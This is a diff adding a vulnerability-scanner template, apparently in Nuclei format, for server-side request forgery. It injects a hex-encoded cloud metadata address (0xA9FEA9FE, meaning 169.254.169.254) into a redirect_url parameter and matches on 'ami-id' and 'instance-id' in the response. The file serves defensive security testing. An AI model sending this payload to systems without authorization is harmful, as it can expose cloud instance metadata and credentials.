@@ -1,0 +1,22 @@
+id: patt-ssrf-overflow-01-redirect_url
+name: 'PATT ssrf patt-ssrf-overflow-01 via redirect_url'
+severity: high
+type: active
+tags:
+  - ssrf
+  - patt
+  - encodeoverflow
+description: 'PATT dotless hex 169.254.169.254. [patt:patt-ssrf-overflow-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      redirect_url:
+        - 'http://0xA9FEA9FE/'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ami-id'
+          - 'instance-id'
+          - 'metadata'
